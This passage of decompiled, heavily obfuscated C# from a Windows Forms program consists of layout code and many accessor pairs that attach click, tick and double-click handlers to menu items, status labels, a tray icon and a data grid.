			size = new Size(862, 333);
			this.ClientSize = size;
			this.Controls.Add(this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002());
			this.DoubleBuffered = true;
			this.Icon = (Icon)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829139480));
			this.Name = global::\u0006\u2001.\u0002(-1829136486);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ResumeLayout(false);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().PerformLayout();
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ResumeLayout(false);
			((ISupportInitialize)this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()).EndInit();
			((ISupportInitialize)this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()).EndInit();
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003().ResumeLayout(false);
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		// Token: 0x0600018F RID: 399 RVA: 0x00017B64 File Offset: 0x00015D64
		internal virtual System.Windows.Forms.Timer 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0003;
		}

		// Token: 0x06000190 RID: 400 RVA: 0x00017B78 File Offset: 0x00015D78
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(System.Windows.Forms.Timer \u0002)
		{
			EventHandler value = new EventHandler(this.\u0006\u2001);
			if (this.\u0003 != null)
			{
				this.\u0003.Tick -= value;
			}
			this.\u0003 = \u0002;
			if (this.\u0003 != null)
			{
				this.\u0003.Tick += value;
			}
		}

		// Token: 0x06000191 RID: 401 RVA: 0x00017BC8 File Offset: 0x00015DC8
		internal virtual StatusStrip 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0005;
		}

		// Token: 0x06000192 RID: 402 RVA: 0x00017BDC File Offset: 0x00015DDC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(StatusStrip \u0002)
		{
			this.\u0005 = \u0002;
		}

		// Token: 0x06000193 RID: 403 RVA: 0x00017BE8 File Offset: 0x00015DE8
		internal virtual ToolStripStatusLabel 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0008;
		}

		// Token: 0x06000194 RID: 404 RVA: 0x00017BFC File Offset: 0x00015DFC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(ToolStripStatusLabel \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008);
			if (this.\u0008 != null)
			{
				this.\u0008.Click -= value;
			}
			this.\u0008 = \u0002;
			if (this.\u0008 != null)
			{
				this.\u0008.Click += value;
			}
		}

		// Token: 0x06000195 RID: 405 RVA: 0x00017C4C File Offset: 0x00015E4C
		internal virtual ToolStripStatusLabel 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u0006;
		}

		// Token: 0x06000196 RID: 406 RVA: 0x00017C60 File Offset: 0x00015E60
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003(ToolStripStatusLabel \u0002)
		{
			EventHandler value = new EventHandler(this.\u0006\u2000);
			if (this.\u0006 != null)
			{
				this.\u0006.Click -= value;
			}
			this.\u0006 = \u0002;
			if (this.\u0006 != null)
			{
				this.\u0006.Click += value;
			}
		}

		// Token: 0x06000197 RID: 407 RVA: 0x00017CB0 File Offset: 0x00015EB0
		internal virtual ContextMenuStrip 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u000E;
		}

		// Token: 0x06000198 RID: 408 RVA: 0x00017CC4 File Offset: 0x00015EC4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(ContextMenuStrip \u0002)
		{
			this.\u000E = \u0002;
		}

		// Token: 0x06000199 RID: 409 RVA: 0x00017CD0 File Offset: 0x00015ED0
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u000F;
		}

		// Token: 0x0600019A RID: 410 RVA: 0x00017CE4 File Offset: 0x00015EE4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(ToolStripMenuItem \u0002)
		{
			this.\u000F = \u0002;
		}

		// Token: 0x0600019B RID: 411 RVA: 0x00017CF0 File Offset: 0x00015EF0
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u0002\u2000;
		}

		// Token: 0x0600019C RID: 412 RVA: 0x00017D04 File Offset: 0x00015F04
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003(ToolStripMenuItem \u0002)
		{
			this.\u0002\u2000 = \u0002;
		}

		// Token: 0x0600019D RID: 413 RVA: 0x00017D10 File Offset: 0x00015F10
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005()
		{
			return this.\u0003\u2000;
		}

		// Token: 0x0600019E RID: 414 RVA: 0x00017D24 File Offset: 0x00015F24
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000E);
			if (this.\u0003\u2000 != null)
			{
				this.\u0003\u2000.Click -= value;
			}
			this.\u0003\u2000 = \u0002;
			if (this.\u0003\u2000 != null)
			{
				this.\u0003\u2000.Click += value;
			}
		}

		// Token: 0x0600019F RID: 415 RVA: 0x00017D74 File Offset: 0x00015F74
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008()
		{
			return this.\u0005\u2000;
		}

		// Token: 0x060001A0 RID: 416 RVA: 0x00017D88 File Offset: 0x00015F88
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000F);
			if (this.\u0005\u2000 != null)
			{
				this.\u0005\u2000.Click -= value;
			}
			this.\u0005\u2000 = \u0002;
			if (this.\u0005\u2000 != null)
			{
				this.\u0005\u2000.Click += value;
			}
		}

		// Token: 0x060001A1 RID: 417 RVA: 0x00017DD8 File Offset: 0x00015FD8
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006()
		{
			return this.\u0008\u2000;
		}

		// Token: 0x060001A2 RID: 418 RVA: 0x00017DEC File Offset: 0x00015FEC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002\u2000);
			if (this.\u0008\u2000 != null)
			{
				this.\u0008\u2000.Click -= value;
			}
			this.\u0008\u2000 = \u0002;
			if (this.\u0008\u2000 != null)
			{
				this.\u0008\u2000.Click += value;
			}
		}

		// Token: 0x060001A3 RID: 419 RVA: 0x00017E3C File Offset: 0x0001603C
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E()
		{
			return this.\u0006\u2000;
		}

		// Token: 0x060001A4 RID: 420 RVA: 0x00017E50 File Offset: 0x00016050
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0006);
			if (this.\u0006\u2000 != null)
			{
				this.\u0006\u2000.Click -= value;
			}
			this.\u0006\u2000 = \u0002;
			if (this.\u0006\u2000 != null)
			{
				this.\u0006\u2000.Click += value;
			}
		}

		// Token: 0x060001A5 RID: 421 RVA: 0x00017EA0 File Offset: 0x000160A0
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F()
		{
			return this.\u000E\u2000;
		}

		// Token: 0x060001A6 RID: 422 RVA: 0x00017EB4 File Offset: 0x000160B4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003\u2000);
			if (this.\u000E\u2000 != null)
			{
				this.\u000E\u2000.Click -= value;
			}
			this.\u000E\u2000 = \u0002;
			if (this.\u000E\u2000 != null)
			{
				this.\u000E\u2000.Click += value;
			}
		}

		// Token: 0x060001A7 RID: 423 RVA: 0x00017F04 File Offset: 0x00016104
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2000()
		{
			return this.\u000F\u2000;
		}

		// Token: 0x060001A8 RID: 424 RVA: 0x00017F18 File Offset: 0x00016118
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005\u2000);
			if (this.\u000F\u2000 != null)
			{
				this.\u000F\u2000.Click -= value;
			}
			this.\u000F\u2000 = \u0002;
			if (this.\u000F\u2000 != null)
			{
				this.\u000F\u2000.Click += value;
			}
		}

		// Token: 0x060001A9 RID: 425 RVA: 0x00017F68 File Offset: 0x00016168
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2000()
		{
			return this.\u0002\u2001;
		}

		// Token: 0x060001AA RID: 426 RVA: 0x00017F7C File Offset: 0x0001617C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008\u2000);
			if (this.\u0002\u2001 != null)
			{
				this.\u0002\u2001.Click -= value;
			}
			this.\u0002\u2001 = \u0002;
			if (this.\u0002\u2001 != null)
			{
				this.\u0002\u2001.Click += value;
			}
		}

		// Token: 0x060001AB RID: 427 RVA: 0x00017FCC File Offset: 0x000161CC
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2000()
		{
			return this.\u0003\u2001;
		}

		// Token: 0x060001AC RID: 428 RVA: 0x00017FE0 File Offset: 0x000161E0
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000E\u2000);
			if (this.\u0003\u2001 != null)
			{
				this.\u0003\u2001.Click -= value;
			}
			this.\u0003\u2001 = \u0002;
			if (this.\u0003\u2001 != null)
			{
				this.\u0003\u2001.Click += value;
			}
		}

		// Token: 0x060001AD RID: 429 RVA: 0x00018030 File Offset: 0x00016230
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000()
		{
			return this.\u0005\u2001;
		}

		// Token: 0x060001AE RID: 430 RVA: 0x00018044 File Offset: 0x00016244
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000F\u2000);
			if (this.\u0005\u2001 != null)
			{
				this.\u0005\u2001.Click -= value;
			}
			this.\u0005\u2001 = \u0002;
			if (this.\u0005\u2001 != null)
			{
				this.\u0005\u2001.Click += value;
			}
		}

		// Token: 0x060001AF RID: 431 RVA: 0x00018094 File Offset: 0x00016294
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2000()
		{
			return this.\u0008\u2001;
		}

		// Token: 0x060001B0 RID: 432 RVA: 0x000180A8 File Offset: 0x000162A8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002\u2001);
			if (this.\u0008\u2001 != null)
			{
				this.\u0008\u2001.Click -= value;
			}
			this.\u0008\u2001 = \u0002;
			if (this.\u0008\u2001 != null)
			{
				this.\u0008\u2001.Click += value;
			}
		}

		// Token: 0x060001B1 RID: 433 RVA: 0x000180F8 File Offset: 0x000162F8
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2000()
		{
			return this.\u0006\u2001;
		}

		// Token: 0x060001B2 RID: 434 RVA: 0x0001810C File Offset: 0x0001630C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003\u2001);
			if (this.\u0006\u2001 != null)
			{
				this.\u0006\u2001.Click -= value;
			}
			this.\u0006\u2001 = \u0002;
			if (this.\u0006\u2001 != null)
			{
				this.\u0006\u2001.Click += value;
			}
		}

		// Token: 0x060001B3 RID: 435 RVA: 0x0001815C File Offset: 0x0001635C
		internal virtual ToolStripStatusLabel 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005()
		{
			return this.\u000E\u2001;
		}

		// Token: 0x060001B4 RID: 436 RVA: 0x00018170 File Offset: 0x00016370
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005(ToolStripStatusLabel \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005\u2001);
			if (this.\u000E\u2001 != null)
			{
				this.\u000E\u2001.Click -= value;
			}
			this.\u000E\u2001 = \u0002;
			if (this.\u000E\u2001 != null)
			{
				this.\u000E\u2001.Click += value;
			}
		}

		// Token: 0x060001B5 RID: 437 RVA: 0x000181C0 File Offset: 0x000163C0
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2000()
		{
			return this.\u000F\u2001;
		}

		// Token: 0x060001B6 RID: 438 RVA: 0x000181D4 File Offset: 0x000163D4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008\u2001);
			if (this.\u000F\u2001 != null)
			{
				this.\u000F\u2001.Click -= value;
			}
			this.\u000F\u2001 = \u0002;
			if (this.\u000F\u2001 != null)
			{
				this.\u000F\u2001.Click += value;
			}
		}

		// Token: 0x060001B7 RID: 439 RVA: 0x00018224 File Offset: 0x00016424
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2001()
		{
			return this.\u0002\u2002;
		}

		// Token: 0x060001B8 RID: 440 RVA: 0x00018238 File Offset: 0x00016438
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000E\u2001);
			if (this.\u0002\u2002 != null)
			{
				this.\u0002\u2002.Click -= value;
			}
			this.\u0002\u2002 = \u0002;
			if (this.\u0002\u2002 != null)
			{
				this.\u0002\u2002.Click += value;
			}
		}

		// Token: 0x060001B9 RID: 441 RVA: 0x00018288 File Offset: 0x00016488
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2001()
		{
			return this.\u0003\u2002;
		}

		// Token: 0x060001BA RID: 442 RVA: 0x0001829C File Offset: 0x0001649C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2001(ToolStripMenuItem \u0002)
		{
			this.\u0003\u2002 = \u0002;
		}

		// Token: 0x060001BB RID: 443 RVA: 0x000182A8 File Offset: 0x000164A8
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2001()
		{
			return this.\u0005\u2002;
		}

		// Token: 0x060001BC RID: 444 RVA: 0x000182BC File Offset: 0x000164BC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000F\u2001);
			if (this.\u0005\u2002 != null)
			{
				this.\u0005\u2002.Click -= value;
			}
			this.\u0005\u2002 = \u0002;
			if (this.\u0005\u2002 != null)
			{
				this.\u0005\u2002.Click += value;
			}
		}

		// Token: 0x060001BD RID: 445 RVA: 0x0001830C File Offset: 0x0001650C
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2001()
		{
			return this.\u0008\u2002;
		}

		// Token: 0x060001BE RID: 446 RVA: 0x00018320 File Offset: 0x00016520
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002\u2002);
			if (this.\u0008\u2002 != null)
			{
				this.\u0008\u2002.Click -= value;
			}
			this.\u0008\u2002 = \u0002;
			if (this.\u0008\u2002 != null)
			{
				this.\u0008\u2002.Click += value;
			}
		}

		// Token: 0x060001BF RID: 447 RVA: 0x00018370 File Offset: 0x00016570
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2001()
		{
			return this.\u0006\u2002;
		}

		// Token: 0x060001C0 RID: 448 RVA: 0x00018384 File Offset: 0x00016584
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003\u2002);
			if (this.\u0006\u2002 != null)
			{
				this.\u0006\u2002.Click -= value;
			}
			this.\u0006\u2002 = \u0002;
			if (this.\u0006\u2002 != null)
			{
				this.\u0006\u2002.Click += value;
			}
		}

		// Token: 0x060001C1 RID: 449 RVA: 0x000183D4 File Offset: 0x000165D4
		internal virtual ToolStripStatusLabel 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008()
		{
			return this.\u000E\u2002;
		}

		// Token: 0x060001C2 RID: 450 RVA: 0x000183E8 File Offset: 0x000165E8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008(ToolStripStatusLabel \u0002)
		{
			this.\u000E\u2002 = \u0002;
		}

		// Token: 0x060001C3 RID: 451 RVA: 0x000183F4 File Offset: 0x000165F4
		internal virtual ToolStripStatusLabel 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006()
		{
			return this.\u000F\u2002;
		}

		// Token: 0x060001C4 RID: 452 RVA: 0x00018408 File Offset: 0x00016608
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006(ToolStripStatusLabel \u0002)
		{
			this.\u000F\u2002 = \u0002;
		}

		// Token: 0x060001C5 RID: 453 RVA: 0x00018414 File Offset: 0x00016614
		internal virtual ToolStripStatusLabel 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E()
		{
			return this.\u0002\u2003;
		}

		// Token: 0x060001C6 RID: 454 RVA: 0x00018428 File Offset: 0x00016628
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E(ToolStripStatusLabel \u0002)
		{
			this.\u0002\u2003 = \u0002;
		}

		// Token: 0x060001C7 RID: 455 RVA: 0x00018434 File Offset: 0x00016634
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001()
		{
			return this.\u0003\u2003;
		}

		// Token: 0x060001C8 RID: 456 RVA: 0x00018448 File Offset: 0x00016648
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005\u2002);
			if (this.\u0003\u2003 != null)
			{
				this.\u0003\u2003.Click -= value;
			}
			this.\u0003\u2003 = \u0002;
			if (this.\u0003\u2003 != null)
			{
				this.\u0003\u2003.Click += value;
			}
		}

		// Token: 0x060001C9 RID: 457 RVA: 0x00018498 File Offset: 0x00016698
		internal virtual ToolStripStatusLabel 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F()
		{
			return this.\u0005\u2003;
		}

		// Token: 0x060001CA RID: 458 RVA: 0x000184AC File Offset: 0x000166AC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F(ToolStripStatusLabel \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008\u2002);
			if (this.\u0005\u2003 != null)
			{
				this.\u0005\u2003.Click -= value;
			}
			this.\u0005\u2003 = \u0002;
			if (this.\u0005\u2003 != null)
			{
				this.\u0005\u2003.Click += value;
			}
		}

		// Token: 0x060001CB RID: 459 RVA: 0x000184FC File Offset: 0x000166FC
		internal virtual \u0008\u2000 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0008\u2003;
		}

		// Token: 0x060001CC RID: 460 RVA: 0x00018510 File Offset: 0x00016710
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(\u0008\u2000 \u0002)
		{
			this.\u0008\u2003 = \u0002;
		}

		// Token: 0x060001CD RID: 461 RVA: 0x0001851C File Offset: 0x0001671C
		internal virtual ImageList 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0006\u2003;
		}

		// Token: 0x060001CE RID: 462 RVA: 0x00018530 File Offset: 0x00016730
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(ImageList \u0002)
		{
			this.\u0006\u2003 = \u0002;
		}

		// Token: 0x060001CF RID: 463 RVA: 0x0001853C File Offset: 0x0001673C
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2001()
		{
			return this.\u000E\u2003;
		}

		// Token: 0x060001D0 RID: 464 RVA: 0x00018550 File Offset: 0x00016750
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0006\u2002);
			if (this.\u000E\u2003 != null)
			{
				this.\u000E\u2003.Click -= value;
			}
			this.\u000E\u2003 = \u0002;
			if (this.\u000E\u2003 != null)
			{
				this.\u000E\u2003.Click += value;
			}
		}

		// Token: 0x060001D1 RID: 465 RVA: 0x000185A0 File Offset: 0x000167A0
		internal virtual \u0005\u2001 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u000F\u2003;
		}

		// Token: 0x060001D2 RID: 466 RVA: 0x000185B4 File Offset: 0x000167B4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(\u0005\u2001 \u0002)
		{
			DataGridViewColumnEventHandler value = new DataGridViewColumnEventHandler(this.\u0002);
			if (this.\u000F\u2003 != null)
			{
				this.\u000F\u2003.ColumnWidthChanged -= value;
			}
			this.\u000F\u2003 = \u0002;
			if (this.\u000F\u2003 != null)
			{
				this.\u000F\u2003.ColumnWidthChanged += value;
			}
		}

		// Token: 0x060001D3 RID: 467 RVA: 0x00018604 File Offset: 0x00016804
		internal virtual NotifyIcon 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0002\u2004;
		}

		// Token: 0x060001D4 RID: 468 RVA: 0x00018618 File Offset: 0x00016818
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(NotifyIcon \u0002)
		{
			MouseEventHandler value = new MouseEventHandler(this.\u0002);
			if (this.\u0002\u2004 != null)
			{
				this.\u0002\u2004.MouseDoubleClick -= value;
			}
			this.\u0002\u2004 = \u0002;
			if (this.\u0002\u2004 != null)
			{
				this.\u0002\u2004.MouseDoubleClick += value;
			}
		}

		// Token: 0x060001D5 RID: 469 RVA: 0x00018668 File Offset: 0x00016868
		internal virtual ContextMenuStrip 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u0003\u2004;
		}

		// Token: 0x060001D6 RID: 470 RVA: 0x0001867C File Offset: 0x0001687C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003(ContextMenuStrip \u0002)
		{
			this.\u0003\u2004 = \u0002;
		}

		// Token: 0x060001D7 RID: 471 RVA: 0x00018688 File Offset: 0x00016888
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2002()
		{
			return this.\u0005\u2004;
		}

		// Token: 0x060001D8 RID: 472 RVA: 0x0001869C File Offset: 0x0001689C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2002(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000E\u2002);
			if (this.\u0005\u2004 != null)
			{
				this.\u0005\u2004.Click -= value;
			}
			this.\u0005\u2004 = \u0002;
			if (this.\u0005\u2004 != null)
			{
				this.\u0005\u2004.Click += value;
			}
		}

		// Token: 0x060001D9 RID: 473 RVA: 0x000186EC File Offset: 0x000168EC
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2002()
		{
			return this.\u0008\u2004;
		}

		// Token: 0x060001DA RID: 474 RVA: 0x00018700 File Offset: 0x00016900
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2002(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000F\u2002);
			if (this.\u0008\u2004 != null)
			{
				this.\u0008\u2004.Click -= value;
			}
			this.\u0008\u2004 = \u0002;
			if (this.\u0008\u2004 != null)
			{
				this.\u0008\u2004.Click += value;
			}
		}

		// Token: 0x060001DB RID: 475 RVA: 0x00018750 File Offset: 0x00016950
		internal virtual ToolStripMenuItem 4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2002()
		{
			return this.\u0006\u2004;
		}

		// Token: 0x060001DC RID: 476 RVA: 0x00018764 File Offset: 0x00016964
		[MethodImpl(MethodImplOptions.Synchronized)]
